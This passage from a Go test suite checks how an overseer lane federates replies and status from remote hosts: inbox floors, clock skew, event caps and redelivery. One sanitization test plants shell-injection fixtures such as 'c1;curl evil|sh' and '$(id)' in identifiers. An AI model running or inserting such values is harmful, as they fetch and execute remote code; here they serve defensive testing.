		t.Errorf("inbox = %+v, want both misrouted keys", in)
	}
}

// A partner whose clock runs ahead must not raise the lane's floor above the
// newest row the answer carried: the floor ends at that row's ts, not at the
// far ts less farSettle, and a later answer carrying no row leaves it there.
func TestOverseerRemoteInboxFloorCapsAtTheNewestRow(t *testing.T) {
	v := fedOverseer(t)
	row := ovStart + 1
	ev := func(ts int64) map[string]any { return map[string]any{"ts": float64(ts), "kind": "msg"} }
	pulls := [][]fleetpkg.FarBatch{
		{{Repo: "o/a", Common: "/git/a/.git", Cursor: row + 1, Events: []map[string]any{ev(row)}}},
		{{Repo: "o/a", Common: "/git/a/.git", Cursor: row + 1}},
	}
	old := hostBatches
	t.Cleanup(func() { hostBatches = old })
	n := 0
	hostBatches = func(fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
		n++
		return pulls[n-1], nil
	}
	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
	// The doc ts is far more than farSettle above the row: only the cap keeps the
	// floor at the row rather than at the far clock less farSettle.
	if got := ovStart + 10*minute - fleetpkg.FarSettle.Milliseconds(); got <= row {
		t.Fatalf("fixture needs the far clock over farSettle above the row: farSettle = %v, line = %d", fleetpkg.FarSettle, got)
	}
	fedRun(t, v, doc(ovStart+10*minute))
	if in := farInbox(t, v.stateDir); in.Floor != row {
		t.Errorf("first pull: floor = %d, want %d, the newest row the answer carried", in.Floor, row)
	}
	fedRun(t, v, doc(ovStart+20*minute))
	if in := farInbox(t, v.stateDir); in.Floor != row || len(in.Seen) != 0 {
		t.Errorf("no-row pull: inbox = %+v, want the floor still %d and no key above it", in, row)
	}
}

// An inbox the lane cannot write is an error line, not a replay: the lane
// keeps what it delivered in memory, so each pull prints only what it has not.
func TestOverseerRemoteInboxWriteFailureDoesNotReprint(t *testing.T) {
	v := fedOverseer(t)
	path := lanepkg.OverseerHostInbox(v.stateDir, "mbp")
	if err := lanepkg.WriteFarInbox(path, lanepkg.FarInbox{Floor: ovStart, Seen: []string{}}); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Dir(path)
	if err := os.Chmod(dir, 0o555); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
	if lanepkg.WriteFarInbox(path, lanepkg.FarInbox{Floor: ovStart, Seen: []string{}}) == nil {
		t.Skip("a read-only dir is writable here")
	}
	ev := func(ts int64, body string) map[string]any {
		return map[string]any{"ts": float64(ts), "kind": "msg", "body": body}
	}
	a1, b1 := ev(ovStart+10, "a1"), ev(ovStart+20, "b1")
	pulls := [][]map[string]any{{a1}, {a1}, {a1, b1}, {a1, b1}}
	old := hostBatches
	t.Cleanup(func() { hostBatches = old })
	n := 0
	hostBatches = func(fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
		n++
		return []fleetpkg.FarBatch{{Repo: "o/a", Common: "/git/a/.git", Cursor: ovStart + 20, Events: pulls[n-1]}}, nil
	}
	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
	got := fedRun(t, v, doc(ovStart), doc(ovStart+1000), doc(ovStart+2000), doc(ovStart+3000))
	want := [][]string{{"a1"}, nil, {"b1"}, nil}
	for i, lines := range got {
		if bodies := farBodies(lines); !slices.Equal(bodies, want[i]) {
			t.Errorf("pull %d printed %q, want %q", i+1, bodies, want[i])
		}
	}
	var errs []any
	for _, l := range slices.Concat(got...) {
		if l["stream"] == "error" {
			errs = append(errs, l["detail"])
		}
	}
	if len(errs) == 0 || !strings.HasPrefix(fmt.Sprint(errs[0]), "inbox: ") {
		t.Errorf("error details = %v, want the inbox write failure", errs)
	}
}

func TestOverseerLinesSanitizeFarIdentifiers(t *testing.T) {
	const evil = "c1;curl evil|sh"
	abandoned := ovWorker("worker:feat/$(id)#s1", "failed")
	abandoned["detail"] = "blocked, no dispatcher reply"
	host := func(ts int64, state, attention string, ws ...map[string]any) fleetpkg.HostStatus {
		r := ovRepo("beta", ovCrew(evil, state, attention, ws...))
		r.Repo = "a/b$(id)"
		return okHost("mbp", ts, r)
	}
	stubBatches(t,
		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "a/b$(id)", Common: "/git/beta/.git", Cursor: ovStart + 10, Events: []map[string]any{{"ts": float64(ovStart + 10), "kind": "msg"}}}}},
		nil)
	got := fedRun(t, fedOverseer(t),
		withHosts(ovDoc(ovStart), host(ovStart, "live", "attended")),
		withHosts(ovDoc(ovStart+minute), host(ovStart+minute, "dead `x`", "unattended", abandoned)))
	lines := slices.Concat(got...)
	if len(ofEvent(lines, "dispatcher_down")) != 1 || len(ofEvent(lines, "abandoned")) != 1 {
		t.Fatalf("lines = %v, want dispatcher_down and abandoned", lines)
	}
	for _, l := range lines {
		raw, err := json.Marshal(l)
		if err != nil {
			t.Fatal(err)
		}
		if i := bytes.IndexAny(raw, "$(;` |"); i >= 0 {
			t.Errorf("%q reached a lane line: %s", raw[i], raw)
		}
	}
}

func TestOverseerRemoteReplyTSInFloatForm(t *testing.T) {
	v := fedOverseer(t)
	stubBatches(t,
		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 20, Events: []map[string]any{
			{"ts": json.Number("1800000000010.0"), "kind": "msg"},
			{"ts": json.Number("1.80000000002e12"), "kind": "msg"},
		}}}},
		nil)
	got := fedRun(t, v, withHosts(ovDoc(ovStart), okHost("mbp", ovStart)))
	if len(got[0]) != 1 {
		t.Fatalf("lines = %v, want the batch", got[0])
	}
	if events, _ := got[0][0]["events"].([]any); len(events) != 2 {
		t.Errorf("events = %v, want both replies above the cursor", got[0][0]["events"])
	}
}

// farRig is the overseer lane of ovHost with mbp its one partner, end to end:
// the lane's status read is the real overseer-mode collection, which pulls mbp
// through ServeFar over a far fleet.
type farRig struct {
	far   *fleettest.Far
	state string
	clock *msClock
	opts  fleetpkg.StatusOptions
	flush func() error
}

func newFarRig(t *testing.T) *farRig {
	t.Helper()
	r := &farRig{far: fleettest.NewFar(t, "mbp", ovStart+minute), state: t.TempDir(), clock: newMSClock(ovStart + minute)}
	r.opts = fleettest.Overseer(t, ovHost, r.state, r.clock.Now, r.far.Serve(), "mbp")
	return r
}

// lane is a fresh overseer lane started at ovStart over the rig's state.
func (r *farRig) lane(t *testing.T) *overseer {
	t.Helper()
	v := bareOverseer(io.Discard, func(ctx context.Context, w io.Writer, hostSince func(string) (int64, bool)) fleetpkg.StatusDoc {
		opts := r.opts
		opts.HostSince = hostSince
		doc := fleetpkg.CollectStatus(ctx, fleetpkg.StatusRequest{}, w, opts)
		if len(doc.Hosts) != 1 || doc.Hosts[0].State != "ok" {
			t.Fatalf("hosts = %+v, want mbp ok", doc.Hosts)
		}
		return doc
	})
	v.host, v.stateDir, v.start, v.timeout, v.interval = ovHost, r.state, ovStart, time.Minute, time.Minute
	v.o.Flush = func() error {
		if r.flush != nil {
			return r.flush()
		}
		return nil
	}
	return v
}

// pull is one status read of v: the bodies of the far replies it printed.
func (r *farRig) pull(t *testing.T, v *overseer) []string {
	t.Helper()
	return farBodies(r.pullLines(t, v))
}

// pullLines is one status read of v: the lane lines it printed.
func (r *farRig) pullLines(t *testing.T, v *overseer) []map[string]any {
	t.Helper()
	var out lockedWriter
	v.out = &laneWriter{w: &out, now: time.Now}
	v.diff(t.Context())
	return decodeLinesT(t, out.str())
}

// farBodies are the bodies of the far replies among lines.
func farBodies(lines []map[string]any) []string {
	var bodies []string
	for _, l := range lines {
		events, _ := l["events"].([]any)
		for _, e := range events {
			ev, _ := e.(map[string]any)
			body, _ := ev["body"].(string)
			bodies = append(bodies, body)
		}
	}
	return bodies
}

// A far reply stamped while a pull ran, but on its bus only after that pull
// folded it, is in the next pull: neither the oldest nor the newest far
// cursor may hold back --since past it. Each reply is printed once, and a new
// lane over the same state replays none.
func TestOverseerRemoteReplyLandingMidPullIsDelivered(t *testing.T) {
	for _, tc := range []struct {
		name    string
		aActive bool
	}{
		{name: "A quiet in pull 1", aActive: true},
		{name: "only B active in pull 1, as one max cursor sees it"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := newFarRig(t)
			if tc.aActive {
				r.far.Repo("a")
			} else {
				r.far.Register("a")
			}
			r.far.Repo("b")
			now := r.far.Now()
			r.far.Append("b", fleettest.Reply(now-10_000, "c2", ovHost, "b1"))
			v := r.lane(t)
			var all []string
			check := func(n int, want ...string) {
				t.Helper()
				got := r.pull(t, v)
				all = append(all, got...)
				if !slices.Equal(got, want) {
					t.Errorf("pull %d printed %q, want %q", n, got, want)
				}
			}
			check(1, "b1")
			r.far.Append("a", fleettest.Reply(now-20_000, "c1", ovHost, "a1"))
			check(2, "a1")
			r.far.Advance(2 * time.Minute)
			r.clock.advance(2 * time.Minute)
			check(3)
			v = r.lane(t)
			check(4)
			slices.Sort(all)
			if !slices.Equal(all, []string{"a1", "b1"}) {
				t.Errorf("printed %q overall, want each reply once", all)
			}
		})
	}
}

// A pull whose batch misses the wire leaves the inbox as it was, so the next
// pull prints that batch again.
func TestOverseerRemoteRedeliversAfterFailedFlush(t *testing.T) {
	r := newFarRig(t)
	r.far.Repo("a")
	r.far.Repo("b")
	now := r.far.Now()
	r.far.Append("b", fleettest.Reply(now-10_000, "c2", ovHost, "b1"))
	v := r.lane(t)
	if got := r.pull(t, v); !slices.Equal(got, []string{"b1"}) {
		t.Fatalf("pull 1 printed %q, want b1", got)
	}
	path := lanepkg.OverseerHostInbox(r.state, "mbp")
	before := readFile(path)
	r.far.Append("a", fleettest.Reply(now-5_000, "c1", ovHost, "a1"))
	r.flush = func() error { return errors.New("pipe") }
	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
		t.Fatalf("pull 2 printed %q, want a1 written before its flush failed", got)
	}
	if after := readFile(path); after != before {
		t.Errorf("inbox after a failed flush = %q, want it unchanged %q", after, before)
	}
	r.flush = nil
	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
		t.Errorf("pull 3 printed %q, want a1 again", got)
	}
	if got := r.pull(t, v); len(got) != 0 {
		t.Errorf("pull 4 printed %q, want nothing", got)
	}
}

// An inbox file the lane can no longer write holds --since below the lane's
// floor; the older replies that pull brings back are not printed again.
func TestOverseerRemoteStaleInboxFileReplaysNothing(t *testing.T) {
	r := newFarRig(t)
	r.far.Repo("a")
	r.far.Append("a", fleettest.Reply(r.far.Now()-10_000, "c1", ovHost, "a1"))
	v := r.lane(t)
	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
		t.Fatalf("pull 1 printed %q, want a1", got)
	}
	path := lanepkg.OverseerHostInbox(r.state, "mbp")
	dir := filepath.Dir(path)
	if err := os.Chmod(dir, 0o555); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
	if lanepkg.WriteFarInbox(path, farInbox(t, r.state)) == nil {
		t.Skip("a read-only dir is writable here")
	}
	advance := func() {
		r.far.Advance(2 * time.Minute)
		r.clock.advance(2 * time.Minute)
	}
	advance()
	r.far.Append("a", fleettest.Reply(r.far.Now()-5_000, "c1", ovHost, "b1"))
	if got := r.pull(t, v); !slices.Equal(got, []string{"b1"}) {
		t.Errorf("pull 2 printed %q, want b1", got)
	}
	advance()
	if got := r.pull(t, v); len(got) != 0 {
		t.Errorf("pull 3 printed %q, want nothing", got)
	}
}

// A partner's first sight seeds its inbox at the lane's start before any
// flush, so the pull after it asks from there, not from the fallback window,
// even when the first batch missed the wire.
func TestOverseerRemoteSeedsPartnerInboxAtTheLaneStart(t *testing.T) {
	r := newFarRig(t)
	r.far.Repo("a")
	r.far.Append("a", fleettest.Reply(r.far.Now()-10_000, "c1", ovHost, "a1"))
	serve := r.far.Serve()
	var sinces []string
	r.opts.Federate = func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
		sinces = append(sinces, argv[len(argv)-1])
		return serve(ctx, host, argv, stdout, stderr)
	}
	v := r.lane(t)
	r.flush = func() error { return errors.New("pipe") }
	r.pull(t, v)
	if in := farInbox(t, r.state); in.Floor != ovStart || len(in.Seen) != 0 {
		t.Errorf("inbox after the first diff = %+v, want floor %d and no keys", in, ovStart)
	}
	r.flush = nil
	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
		t.Errorf("pull 2 printed %q, want a1", got)
	}
	if len(sinces) != 2 || sinces[1] != fmt.Sprint(ovStart) {
		t.Errorf("--since of each pull = %q, want the second at the lane start %d", sinces, ovStart)
	}
}

// A partner's first pull asks from the lane's start, not the fallback
// window: a reply older than that window but newer than the lane's start is
// still served. Both clocks sit 25 h past the lane start, so the fallback
// window (now-24 h, here ovStart+1h1m) begins above the reply at ovStart+1h.
// On main the first pull asks from there, serves nothing, and then raises its
// floor to the answer's clock, so the reply is never delivered.
func TestOverseerFirstPullSinceIsTheLaneStart(t *testing.T) {
	r := newFarRig(t)
	r.far.Advance(25 * time.Hour)
	r.clock.advance(25 * time.Hour)
	r.far.Repo("a")
	r.far.Append("a", fleettest.Reply(ovStart+time.Hour.Milliseconds(), "c1", ovHost, "reply-1h"))
	serve := r.far.Serve()
	var sinces []string
	r.opts.Federate = func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
		sinces = append(sinces, argv[len(argv)-1])
		return serve(ctx, host, argv, stdout, stderr)
	}
	v := r.lane(t)
	if got := r.pull(t, v); !slices.Equal(got, []string{"reply-1h"}) {
		t.Errorf("first pull delivered %q, want reply-1h", got)
	}
	if len(sinces) != 1 || sinces[0] != fmt.Sprint(ovStart) {
		t.Errorf("first pull --since = %q, want the lane start %d", sinces, ovStart)
	}
}

// Twice an answer's worth of replies, over many far buses, leave one inbox
// file whose keys are only those above its floor.
func TestFarInboxStateIsBounded(t *testing.T) {
	const repos, perRepo, pulls = 10, 20, 5
	if repos*perRepo*pulls != 2*fleetpkg.FarMaxEvents {
		t.Fatalf("the fixture posts %d replies, want %d", repos*perRepo*pulls, 2*fleetpkg.FarMaxEvents)
	}
	r := newFarRig(t)
	for i := range repos {
		r.far.Repo(fmt.Sprintf("r%d", i))
	}
	v := r.lane(t)
	var posted []int64
	printed := map[string]int{}
	for n := range pulls {
		now := r.far.Now()
		for i := range repos {
			for j := range perRepo {
				ts := now - 1000 - int64(i*perRepo+j)
				posted = append(posted, ts)
				r.far.Append(fmt.Sprintf("r%d", i), fleettest.Reply(ts, "c1", ovHost, fmt.Sprintf("p%d-r%d-%d", n, i, j)))
			}
		}
		got := r.pull(t, v)
		if len(got) != repos*perRepo {
			t.Errorf("pull %d printed %d replies, want %d", n, len(got), repos*perRepo)
		}
		for _, b := range got {
			printed[b]++
		}
		in := farInbox(t, r.state)
		// The floor is the far clock less farSettle, capped by the newest row the
		// answer carried (the last reply this pull posted, now-1s, which sits
		// above that line): pin it, so the inbox bound is a floor assertion rather
		// than a comparison an empty inbox would satisfy.
		newest := now - 1000
		if want := min(now-fleetpkg.FarSettle.Milliseconds(), newest); in.Floor != want {
			t.Errorf("pull %d: floor = %d, want %d, the far clock less farSettle capped at the newest row", n, in.Floor, want)
		}
		if want := repos * perRepo; len(in.Seen) != want || len(in.Seen) > farSeenCap {
			t.Errorf("pull %d: %d keys, want the %d replies above floor %d, within the cap %d", n, len(in.Seen), want, in.Floor, farSeenCap)
		}
		r.far.Advance(2 * time.Minute)
		r.clock.advance(2 * time.Minute)
	}
	if len(printed) != len(posted) {
		t.Errorf("printed %d distinct replies, want %d", len(printed), len(posted))
	}
	for b, n := range printed {
		if n != 1 {
			t.Errorf("%s printed %d times, want once", b, n)
		}
	}
	if got, want := tree(t, lanepkg.OverseerHostDir(r.state, "mbp")), []string{"inbox.json", "ok"}; !slices.Equal(got, want) {
		t.Errorf("host dir holds %q, want %q", got, want)
	}
}

// farReplies is n far replies from c1 to ovHost at ts, bodies prefix0000 on.
func farReplies(n int, ts int64, prefix string) []string {
	var lines []string
	for i := range n {
		lines = append(lines, fleettest.Reply(ts, "c1", ovHost, fmt.Sprintf("%s%04d", prefix, i)))
	}
	return lines
}

// A far answer over the event cap is cut oldest-first with its ts lowered
// below the first row it left out, so three pulls deliver every reply once,
// oldest first, each within the cap, and a fourth delivers none.
func TestOverseerFarOverCapDeliversEveryReply(t *testing.T) {
	r := newFarRig(t)
	r.far.Advance(30 * time.Minute)
	r.clock.advance(30 * time.Minute)
	r.far.Repo("a")
	const n = 1200
	base := r.far.Now()
	var lines []string
	for i := range n {
		lines = append(lines, fleettest.Reply(base-1_200_000+int64(i)*1000, "c1", ovHost, fmt.Sprintf("r%04d", i)))
	}
	r.far.Append("a", lines...)
	v := r.lane(t)
	var all []string
	for p := 1; p <= 3; p++ {
		bodies := r.pull(t, v)
		if len(bodies) > fleetpkg.FarMaxEvents {
			t.Errorf("pull %d delivered %d replies, over the cap", p, len(bodies))
		}
		all = append(all, bodies...)
	}
	if len(all) != n {
		t.Fatalf("three pulls delivered %d replies, want %d", len(all), n)
	}
	if again := r.pull(t, v); len(again) != 0 {
		t.Errorf("a fourth pull delivered %d replies again", len(again))
	}
	for i, b := range all {
		if want := fmt.Sprintf("r%04d", i); b != want {
			t.Fatalf("reply %d = %s, want %s: oldest first, each once", i, b, want)
		}
	}
}

// A partner whose clock runs ahead must not raise the lane's floor past the
// replies the far still owes. The far clock is 10 min ahead of the lane start,
// so the first answer reports a doc ts far above the reply it carried; a later
// reply whose ts trails that clock by far more than FarSettle is still asked
// for. On main the floor rose to the far ts less FarSettle, above the second
// reply, so the far never served it again.
func TestOverseerFarClockAheadDelivers(t *testing.T) {
	r := newFarRig(t)
	r.far.Advance(9 * time.Minute) // the far clock, 10 min ahead of the lane's start
	r.far.Repo("a")
	// The answer's doc ts is ~10 min above this row, so on main the floor it
	// raises to sits far above the row that the answer carried.
	r.far.Append("a", fleettest.Reply(ovStart+5_000, "c1", ovHost, "early"))
	v := r.lane(t)
	if got := r.pull(t, v); !slices.Equal(got, []string{"early"}) {
		t.Fatalf("pull 1 printed %q, want early", got)
	}
	// This row lands after that answer, 30 s after the lane start: its ts trails
	// the far clock by 9.5 min, more than FarSettle, so only the capped floor
	// keeps it above the next --since.
	r.far.Append("a", fleettest.Reply(ovStart+30_000, "c1", ovHost, "late"))
	if got := r.pull(t, v); !slices.Equal(got, []string{"late"}) {
		t.Errorf("pull 2 printed %q, want late: a far-clock-ahead partner's floor rose past a reply it still owed", got)
	}
}

// A far repo whose name is no identifier still has its replies delivered,
// unlabeled: neither a far path nor its raw or `?`-sanitized label reaches
// the printed lines.
func TestOverseerFarUnlabeledReposDeliver(t *testing.T) {
	r := newFarRig(t)
	long := strings.Repeat("l", 130)
	names := []string{"my repo", "c++", long}
	base := r.far.Now()
	for i, name := range names {
		r.far.Repo(name)
		r.far.Append(name, fleettest.Reply(base-int64(i+1)*10_000, "c1", ovHost, "body-"+name[:2]))
	}
	v := r.lane(t)
	lines := r.pullLines(t, v)
	bodies := farBodies(lines)
	slices.Sort(bodies)
	if want := []string{"body-c+", "body-ll", "body-my"}; !slices.Equal(bodies, want) {
		t.Errorf("delivered %q, want %q", bodies, want)
	}
	root := filepath.Dir(filepath.Dir(r.far.Common("c++")))
	var printed strings.Builder
	for _, l := range lines {
		raw, err := json.Marshal(l)
		if err != nil {
			t.Fatal(err)
		}
		printed.Write(raw)
		printed.WriteByte('\n')
	}
	for _, raw := range []string{root, "my repo", "c++", long, "my?repo", "c??"} {
		if strings.Contains(printed.String(), raw) {
			t.Errorf("%q was printed:\n%s", raw, printed.String())
		}
	}
}

// A cut never splits a ts group: the first pull delivers the older group
// whole and nothing of the next, and later pulls deliver the rest, each once.
func TestOverseerFarCutKeepsTsGroupsWhole(t *testing.T) {
	r := newFarRig(t)
	r.far.Advance(30 * time.Minute)
	r.clock.advance(30 * time.Minute)
	r.far.Repo("a")
	base := r.far.Now()
	t1, t2 := base-120_000, base-60_000
	r.far.Append("a", slices.Concat(farReplies(300, t1, "a"), farReplies(300, t2, "b"))...)
	v := r.lane(t)
	from := func(prefix string) func(string) bool {
		return func(b string) bool { return !strings.HasPrefix(b, prefix) }
	}
	if first := r.pull(t, v); len(first) != 300 || slices.ContainsFunc(first, from("a")) {
		t.Fatalf("first pull delivered %d replies, want the 300 at t1 only", len(first))
	}
	if second := r.pull(t, v); len(second) != 300 || slices.ContainsFunc(second, from("b")) {
		t.Errorf("second pull delivered %d replies, want the 300 at t2", len(second))
	}
	if again := r.pull(t, v); len(again) != 0 {
		t.Errorf("a third pull delivered %d replies again", len(again))
	}
}

// A far answer over the event cap lands in two pulls even when the lane
// cannot rewrite its inbox file: the floor lives in memory, so the far is not
// asked from the file's stale floor and does not re-serve rows the lane
// already delivered. On main the pull's --since is read from the stale file,
// the far serves the same oldest FarMaxEvents rows again, the lane's raised
// in-memory floor drops them, and it stalls forever.
func TestOverseerFarStallWithAnUnwritableInboxFile(t *testing.T) {
	r := newFarRig(t)
	r.far.Advance(30 * time.Minute)
	r.clock.advance(30 * time.Minute)
	r.far.Repo("a")
	// The file's floor starts well below the lane start, and stays there: the
	// directory below it is read-only, so the lane cannot advance the file.
	path := lanepkg.OverseerHostInbox(r.state, "mbp")
	if err := lanepkg.WriteFarInbox(path, lanepkg.FarInbox{Floor: ovStart - 10*minute, Seen: []string{}}); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Dir(path)
	if err := os.Chmod(dir, 0o555); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
	if lanepkg.WriteFarInbox(path, lanepkg.FarInbox{Floor: ovStart, Seen: []string{}}) == nil {
		t.Skip("a read-only dir is writable here")
	}
	// Just over two answers' worth, at distinct ts so the first pull is cut by
	// the row cap alone, and all above the lane start (and the stale floor).
	const n = 2*fleetpkg.FarMaxEvents + 50
	base := r.far.Now()
	var lines []string
	for i := range n {
		lines = append(lines, fleettest.Reply(base-int64(n)*1000+int64(i)*1000, "c1", ovHost, fmt.Sprintf("s%04d", i)))
	}
	r.far.Append("a", lines...)
	v := r.lane(t)
	first := r.pull(t, v)
	if len(first) != fleetpkg.FarMaxEvents {
		t.Fatalf("pull 1 delivered %d replies, want %d", len(first), fleetpkg.FarMaxEvents)
	}
	second := r.pull(t, v)
	if len(second) == 0 {
		t.Fatalf("pull 2 delivered nothing, want the rest of the backlog")
	}
	// A far answer carries at most FarMaxEvents rows, so just over two answers'
	// worth needs a third pull; the point is that it never stalls at the stale
	// file floor.
	third := r.pull(t, v)
	all := slices.Concat(first, second, third)
	if len(all) != n {
		t.Errorf("three pulls delivered %d replies, want %d", len(all), n)
	}
	seen := map[string]int{}
	for _, b := range all {
		seen[b]++
	}
	for b, c := range seen {
		if c != 1 {
			t.Errorf("%s delivered %d times, want once", b, c)
		}
	}
}

// A partner whose lane is dead and whose crew has a worker the lane strands
// must not read a cut answer's lowered ts as a clock that has fallen behind:
// the host's own status clock is the far clock, so while a backlog still
// drains no lane_dead fires. On main the cut ts is the host ts, the first
// pull's dead_since sits ~19 min behind the second pull's far clock, and
// lane_dead fires on the second pull.
func TestOverseerBacklogKeepsHostClockAlive(t *testing.T) {
	r := newFarRig(t)
	r.far.Advance(39 * time.Minute)
	r.clock.advance(39 * time.Minute)
	crew := r.far.DeadLaneCrew("a", "c9", 5*time.Minute)
	r.far.Append("a", statusRow(r.far.Now()-30*time.Minute.Milliseconds(), crew, "worker:feat/a#s1-1", "done"))

	// (i) The partner's own document names a live dispatcher whose lane is
	// dead, with a worker the lane strands: a fixture that does nothing fails
	// here, not silently.
	doc := fleetpkg.CollectStatus(t.Context(), fleetpkg.StatusRequest{}, io.Discard, r.opts)
	if len(doc.Hosts) != 1 || doc.Hosts[0].State != "ok" {
		t.Fatalf("hosts = %+v, want mbp ok", doc.Hosts)
	}
	var c fleetpkg.CrewStatus
	found := false
	for _, repo := range doc.Hosts[0].Repos {
		for _, got := range repo.Crews {
			if got.CrewID == crew {
				c, found = got, true
			}
		}
	}
	if !found {
		t.Fatalf("crew %s not in the partner's document: %+v", crew, doc.Hosts[0].Repos)
	}
	if c.Dispatcher.State != "live" || c.Dispatcher.Lane == nil || *c.Dispatcher.Lane != "dead" {
		t.Fatalf("dispatcher = %+v, want a live dispatcher whose lane is dead", c.Dispatcher)
	}
	if len(c.Workers) != 1 || c.Workers[0]["stale"] != false {
		t.Fatalf("workers = %+v, want one not-stale worker the lane strands", c.Workers)
	}

	// (ii) The backlog's oldest rows sit over laneDeadAfter below the far
	// clock, so a clock read off the cut reads as long stopped.
	oldest := r.far.Now() - 30*time.Minute.Milliseconds()
	var lines []string
	for i := range fleetpkg.FarMaxEvents {
		lines = append(lines, fleettest.Reply(oldest, crew, ovHost, fmt.Sprintf("a%04d", i)))
	}
	lines = append(lines, fleettest.Reply(r.far.Now()-20*time.Minute.Milliseconds(), crew, ovHost, "b0000"))
	r.far.Append("a", lines...)
	if below := r.far.Now() - oldest; below < laneDeadAfter.Milliseconds() {
		t.Fatalf("the backlog is only %d ms below the far clock, want at least %d", below, laneDeadAfter.Milliseconds())
	}

	// (iii) Two pulls, replies still arriving, print no lane_dead: the first
	// answer's cut never becomes the clock the differ ages the lane against.
	v := r.lane(t)
	if got := ofEvent(r.pullLines(t, v), "lane_dead"); len(got) != 0 {
		t.Fatalf("pull 1 fired lane_dead: %v", got)
	}
	r.far.Advance(2 * time.Minute)
	r.clock.advance(2 * time.Minute)
	r.far.Append("a", fleettest.Reply(r.far.Now()-30_000, crew, ovHost, "fresh"))
	second := r.pullLines(t, v)
	if got := farBodies(second); !slices.Contains(got, "fresh") {
		t.Errorf("pull 2 delivered %q, want the fresh reply", got)
	}
	if got := ofEvent(second, "lane_dead"); len(got) != 0 {
		t.Fatalf("pull 2 fired lane_dead: %v", got)
	}
}

// A far partner's head hold in an unlabeled repo still fires at this lane: the
// served queue's head carries no repo label, and the lane prints one
// capacity_stuck line with cause head_wait, the hold's host the partner, and
// neither the far path nor the raw or sanitized label on the wire.
func TestOverseerFarUnlabeledHeadStuck(t *testing.T) {
	r := newFarRig(t)
	v := r.lane(t)
	r.pullLines(t, v) // the baseline: the partner has no queue yet
	id := r.far.HeadHold("my repo", "c1", 3600)
	lines := r.pullLines(t, v)
	stuck := ofEvent(lines, "capacity_stuck")
	if len(stuck) != 1 {
		t.Fatalf("capacity_stuck = %v, want exactly one", stuck)
	}
	l := stuck[0]
	if l["cause"] != "head_wait" || l["host"] != "mbp" || l["hold"] != id || l["repo"] != "" {
		t.Errorf("line = %v, want cause head_wait, host mbp, hold %s and no repo", l, id)
	}
	raw, err := json.Marshal(lines)
	if err != nil {
		t.Fatal(err)
	}
	root := filepath.Dir(filepath.Dir(r.far.Common("my repo")))
	for _, bad := range []string{root, "my repo", "my?repo"} {
		if bytes.Contains(raw, []byte(bad)) {
			t.Errorf("%q reached the wire:\n%s", bad, raw)
		}
	}
}
